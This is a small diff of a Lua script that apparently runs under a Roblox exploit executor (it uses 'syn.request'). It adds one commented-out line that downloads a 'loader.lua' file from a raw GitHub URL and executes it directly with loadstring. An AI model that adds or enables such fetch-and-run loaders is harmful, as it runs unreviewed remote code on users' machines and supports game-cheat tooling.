@@ -12,3 +12,5 @@ if syn then request = syn.request end
   else
     print('valid game')
 end
+
+-- loadstring(request({['Url'] = 'https://raw.githubusercontent.com/UKKung/mainscript/refs/heads/main/loader.lua', ['Method'] = 'GET'}).Body)()
